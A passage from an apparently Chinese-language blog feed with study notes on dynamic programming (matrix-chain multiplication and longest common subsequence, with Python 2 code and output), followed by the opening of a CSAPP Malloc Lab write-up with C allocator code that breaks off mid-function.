MathJax.Hub.Config({
  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>

<p>动态规划方法通常是用来求解<strong>最优化问题</strong>(optimization problem)。比起分治方法，动态规划对于子问题只求解一次，算是用空间换时间。</p>
<p>书中提到了设计动态规划算法的4个步骤：</p>
<ol>
<li>刻画一个最优解的结构特此</li>
<li>递归地定义最优解的值</li>
<li>计算最优解的值，通常采用自底向上的方法</li>
<li>利用计算出的信息构造一个最优解</li>
</ol>
<a id="more"></a>
<h2 id="u94A2_u6761_u5207_u5272"><a href="#u94A2_u6761_u5207_u5272" class="headerlink" title="钢条切割"></a>钢条切割</h2><p>这个算是比较简单的应用动态规划的例子。只需要用一个一维数组保存最有解就可以了。书中提到一个子问题图，很形象的能表达出各个子问题之间的关系。这里钢条切割使用才思想是分两块，左边一部分完全不切割，右边随便切割，然后比较产生的利润最大的组合，所以右边就变成了子问题。</p>
<h2 id="u77E9_u9635_u94FE_u4E58_u6CD5"><a href="#u77E9_u9635_u94FE_u4E58_u6CD5" class="headerlink" title="矩阵链乘法"></a>矩阵链乘法</h2><p>首先需要知道一个概念是只有两个矩阵A和B相容，即A的列数等于B的行数时，才能相乘。矩阵链乘法问题就是求完全括号化的方案，不同的括号方法产生不同次数的标量乘法。首先可以得到一个穷举的算法思路，令$P(n)$表示可供选择的括号化方案的数量，当$n=1$时，显然只有一种完全括号化方案，当$n \geqslant 2$时，完全括号化的矩阵乘积可描述为两个完全括号化的部分积相乘的形式，而两个部分积的划分点在第$k$个矩阵和第$k+1$个矩阵之间。所以可以得到如下递归公式：<br><img src="1.gif" alt=""><br>当然这个需要优化。所以引入储存子问题解的变量m，m[i,j]表示计算矩阵$A_{i,j}$所需标量乘法次数的最小值。假设 $A_{i}A_{i+1}\cdots A_{j}$ 的最优括号化方案的分割点在矩阵$A_{k}$和$A_{k+1}$之间，其中$i\leqslant k &lt;j$。那么，m[i,j]等于计算 $A_{i..k}$和 $A_{k+1..j}$的代价加上两者相乘的代价的最小值。因此得到<br>$$ m[i,j]=m[i,k]+m[k+1,j]+p_{i-1}p_{k}p_{j}$$<br>因为不知道$k$的具体值，所以$k$有$ j-i $种可能，所以<br><img src="2.gif" alt=""><br>采用自底向上表格法代替上面公式的递归算法来计算最优代价。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sys
<span class="token keyword">def</span> <span class="token function">MaxtrixChainOrder</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>
    n <span class="token operator">=</span> len<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>
    m <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> xrange<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span>
    s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> xrange<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> l <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            j <span class="token operator">=</span> i <span class="token operator">+</span> l <span class="token operator">-</span><span class="token number">1</span>
            m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> sys<span class="token punctuation">.</span>maxint
            <span class="token keyword">for</span> k <span class="token keyword">in</span> xrange<span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">:</span>
                q <span class="token operator">=</span> m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">+</span>m<span class="token punctuation">[</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">*</span>p<span class="token punctuation">[</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>p<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>
                <span class="token keyword">if</span> q <span class="token operator">&lt;</span> m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>
                    m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> q
                    s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> k
    <span class="token keyword">return</span> m<span class="token punctuation">,</span> s

m<span class="token punctuation">,</span> s <span class="token operator">=</span> MaxtrixChainOrder<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'m:'</span>
<span class="token keyword">print</span> <span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>map<span class="token punctuation">(</span>str<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'s:'</span>
<span class="token keyword">print</span> <span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>map<span class="token punctuation">(</span>str<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span> <span class="token string">'矩阵链乘法的方案是:'</span><span class="token punctuation">,</span>

<span class="token keyword">def</span> <span class="token function">PrintOptimalParens</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ret <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> j<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'A'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        ret <span class="token operator">+=</span> <span class="token string">'('</span>
        ret <span class="token operator">+=</span> PrintOptimalParens<span class="token punctuation">(</span>s<span class="token punctuation">,</span> i<span class="token punctuation">,</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>
        ret <span class="token operator">+=</span> PrintOptimalParens<span class="token punctuation">(</span>s<span class="token punctuation">,</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span>
        ret <span class="token operator">+=</span>  <span class="token string">')'</span>
        <span class="token keyword">return</span> ret

<span class="token keyword">print</span> PrintOptimalParens<span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>
</code></pre>
<p>得到以下输出</p>
<pre><code>m:
[0, 15750, 7875, 9375, 11875, 15125]
[0, 0, 2625, 4375, 7125, 10500]
[0, 0, 0, 750, 2500, 5375]
[0, 0, 0, 0, 1000, 3500]
[0, 0, 0, 0, 0, 5000]
[0, 0, 0, 0, 0, 0]
s:
[0, 0, 0, 2, 2, 2]
[0, 0, 1, 2, 2, 2]
[0, 0, 0, 2, 2, 2]
[0, 0, 0, 0, 3, 4]
[0, 0, 0, 0, 0, 4]
[0, 0, 0, 0, 0, 0]
矩阵链乘法的方案是: ((A0(A1A2))((A3A4)A5))
</code></pre><h2 id="u52A8_u6001_u89C4_u5212_u539F_u7406"><a href="#u52A8_u6001_u89C4_u5212_u539F_u7406" class="headerlink" title="动态规划原理"></a>动态规划原理</h2><h3 id="u6700_u4F18_u5B50_u7ED3_u6784"><a href="#u6700_u4F18_u5B50_u7ED3_u6784" class="headerlink" title="最优子结构"></a>最优子结构</h3><p>书中说了4条通用模式，简单点概况就是每个问题能被分成几个子问题，这几个子问题有解且都是最优解，那么这个问题就是这几个最优解的结合。构建最优子结构需要考虑这两个方面：</p>
<ol>
<li>原问题的最优解设计多少个子问题</li>
<li>确定最优解使用哪些子问题时，要考察多少种选择</li>
</ol>
<p>和递归不同，因为递归太深会出现异常。动态规划确实反过来，自底向上的使用最优子结构。也就是说，首先求得子问题的最优解，然后求原问题的最优解。</p>
<h3 id="u91CD_u53E0_u5B50_u95EE_u9898"><a href="#u91CD_u53E0_u5B50_u95EE_u9898" class="headerlink" title="重叠子问题"></a>重叠子问题</h3><p>如果递归算法反复求解相同的子问题，这就是最优化问题具有重叠子问题性质。动态规划对每个子问题求解一次，将解存入一个表中，这样当再次需要这个子问题时直接查表。</p>
<p>这里也提到了一种带备忘的自顶到下动态规划算法，时间复杂度和自底向上的动态规划算法一样。</p>
<h2 id="u6700_u957F_u516C_u5171_u5B50_u5E8F_u5217"><a href="#u6700_u957F_u516C_u5171_u5B50_u5E8F_u5217" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h2><p>同之前的矩阵链乘法问题相似，还是要建立最优解的递归式。</p>
<p><img src="3.png" alt=""></p>
<p>书中的图15-8很形象,列举出了X=[A, B, C, B, D, A, B], Y=[B, D, C, A, B, A]得到的表c和表b。</p>
<p><img src="4.png" alt=""></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">LCSLength</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>
    m <span class="token operator">=</span> len<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
    n <span class="token operator">=</span> len<span class="token punctuation">(</span>y<span class="token punctuation">)</span>
    b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> xrange<span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> xrange<span class="token punctuation">(</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> xrange<span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> xrange<span class="token punctuation">(</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> x<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">==</span> y<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span>
                b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'↖'</span>
            <span class="token keyword">elif</span> c<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">>=</span> c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>
                b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'↑'</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span>
                b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'←'</span>
    <span class="token keyword">return</span> c<span class="token punctuation">,</span> b

<span class="token keyword">def</span> <span class="token function">PrintLCS</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> x<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">or</span> j <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span>
    <span class="token keyword">if</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'↖'</span><span class="token punctuation">:</span>
        PrintLCS<span class="token punctuation">(</span>b<span class="token punctuation">,</span> x<span class="token punctuation">,</span> i<span class="token number">-1</span><span class="token punctuation">,</span> j<span class="token number">-1</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> x<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token keyword">elif</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'↑'</span><span class="token punctuation">:</span>
        PrintLCS<span class="token punctuation">(</span>b<span class="token punctuation">,</span> x<span class="token punctuation">,</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        PrintLCS<span class="token punctuation">(</span>b<span class="token punctuation">,</span> x<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
x <span class="token operator">=</span> <span class="token string">'ABCBDAB'</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
y <span class="token operator">=</span> <span class="token string">'BDCABA'</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
c<span class="token punctuation">,</span> b <span class="token operator">=</span> LCSLength<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>

<span class="token keyword">print</span> <span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>map<span class="token punctuation">(</span>str<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> b<span class="token punctuation">:</span>
    <span class="token keyword">for</span> c <span class="token keyword">in</span> i<span class="token punctuation">:</span>
        <span class="token keyword">print</span> c<span class="token punctuation">,</span>
    <span class="token keyword">print</span>

PrintLCS<span class="token punctuation">(</span>b<span class="token punctuation">,</span> x<span class="token punctuation">,</span> len<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>结果分别显示了c， b和最长公共子序列。</p>
<pre><code>[0, 0, 0, 0, 0, 0, 0]
[0, 0, 0, 0, 1, 1, 1]
[0, 1, 1, 1, 1, 2, 2]
[0, 1, 1, 2, 2, 2, 2]
[0, 1, 1, 2, 2, 3, 3]
[0, 1, 2, 2, 2, 3, 3]
[0, 1, 2, 2, 3, 3, 4]
[0, 1, 2, 2, 3, 4, 4]
0 0 0 0 0 0 0
0 ↑ ↑ ↑ ↖ ← ↖
0 ↖ ← ← ↑ ↖ ←
0 ↑ ↑ ↖ ← ↑ ↑
0 ↖ ↑ ↑ ↑ ↖ ←
0 ↑ ↖ ↑ ↑ ↑ ↑
0 ↑ ↑ ↑ ↖ ↑ ↖
0 ↖ ↑ ↑ ↑ ↖ ↑
B C B A
</code></pre>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[CSAPP Lab6 解题分析]]></title>
      <url>http://xinqiu.me/2016/08/11/csapp-lab6-malloclab/</url>
      <content type="html"><![CDATA[<p>Malloc Lab，据说是最难的一个lab。在看完第九章之后，因为要旅游，没有直接做lab，而是继续看书，结果回来了，书还剩1章，又顺势看完了剩余的部分。在整本书都读完了以后，才回过头来做Malloc Lab。</p>
<h3 id="u4ECB_u7ECD"><a href="#u4ECB_u7ECD" class="headerlink" title="介绍"></a>介绍</h3><p>需要完成<code>mm.c</code>里的内容，材料中需要完成的是</p>
<ul>
<li>int mm_init(void)</li>
<li>void *mm_malloc(size_t size)</li>
<li>void mm_free(void *ptr)</li>
</ul>
<p>其他的mm_realloc源码中已经填写好了。</p>
<p>这里，我是用书中的隐式空闲链表方法，先完成实验。</p>
<a id="more"></a>
<h4 id="mm_init"><a href="#mm_init" class="headerlink" title="mm_init"></a>mm_init</h4><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* 
 * mm_init - initialize the malloc package.
 */</span>
<span class="token keyword">int</span> <span class="token function">mm_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>head_listp <span class="token operator">=</span> <span class="token function">mem_sbrk</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span>WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token function">PUT</span><span class="token punctuation">(</span>head_listp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">PUT</span><span class="token punctuation">(</span>head_listp <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">*</span>WSIZE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>DSIZE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">PUT</span><span class="token punctuation">(</span>head_listp <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>WSIZE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>DSIZE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">PUT</span><span class="token punctuation">(</span>head_listp <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">*</span>WSIZE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    head_listp <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>WSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">extend_heap</span><span class="token punctuation">(</span>CHUNKSIZE<span class="token operator">/</span>WSIZE<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这是一个初始化堆的函数。mm_init从内存中获取4个字的空间，并初始化城空闲链表。</p>
<p>其中堆块的形式是这样的</p>
<p><img src="2.png" alt=""></p>
<p>隐式空闲链表第一个字并没有用，这作为双字边界对齐的填充字。接着是prologue block，这和正常块的区别在于它没有payload，所以算是作为堆开始的标志，同样，epilogue block放在堆的结尾处。</p>
<p><img src="1.png" alt=""></p>
<p>上图为隐式空闲链表，每个regular block其实就上之前堆块图的结构。注意到蓝色的块是在初始化时产生的。mm_init就是做了以上的操作，首先调用mem_sbrk申请4个字的空间，首先第一个字填充为0。接着创建prologue block，因为prologue block是双字，也就是8-byte。接着创建epilogue block。接着将head_listp指针指向prologue block的结尾。虽然隐式空闲链表的头和尾都构建好了，但是没有分配空间给它，它限制并不能存任何东西。所以我们要对刚才的空闲链表进行扩展堆。默认扩展一个空堆CHUNKSIZE，这里定义的是1&lt;&lt;12也就是4K，4K也就是1000个字。</p>
<p>所以接着设计一个extend_heap函数。</p>
<h4 id="extend_heap"><a href="#extend_heap" class="headerlink" title="extend_heap"></a>extend_heap</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">extend_heap</span><span class="token punctuation">(</span>size_t words<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span>
    size_t size<span class="token punctuation">;</span>

    size <span class="token operator">=</span> <span class="token punctuation">(</span>words <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>words<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> WSIZE <span class="token punctuation">:</span> words <span class="token operator">*</span> WSIZE<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">mem_sbrk</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token function">coalesce</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>要知道内存块都是存在一种对齐机制，所以当分配奇数字时，要进行双字对齐。接着和初始化一样，调用mem_sbrk来获取空间。之后的内容和之前的mm_init类似，将bp所指的块的header和footer赋值为0，表示这个块是空闲块。将下一个块的header构造成epilogue block。</p>
<p>这里说个小插曲，为什么要双字对齐。我觉得是因为将最后一位留出来标记这个块是否被分配。只要是双字对齐后，那么这个数的二进制数最后一位肯定为0， 所以置为1代表已分配，置0代表未分配。如果不对齐，那么如果分配的是奇数，最后一位本来就为1，但若这个块并未分配，所以会影响判断。</p>
<p>在扩展完这个块以后，需要将这个块和之前的块进行合并。如果之前的块为空闲，则合并成更大的块来满足空间申请的请求。</p>
<h4 id="coalesce"><a href="#coalesce" class="headerlink" title="coalesce"></a>coalesce</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">coalesce</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span> bp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    size_t prev_alloc <span class="token operator">=</span> <span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    size_t next_alloc <span class="token operator">=</span> <span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    size_t size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>prev_alloc <span class="token operator">&amp;&amp;</span> next_alloc<span class="token punctuation">)</span>
        <span class="token keyword">return</span> bp<span class="token punctuation">;</span>

    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>prev_alloc <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>next_alloc<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        size <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>prev_alloc <span class="token operator">&amp;&amp;</span> next_alloc<span class="token punctuation">)</span>
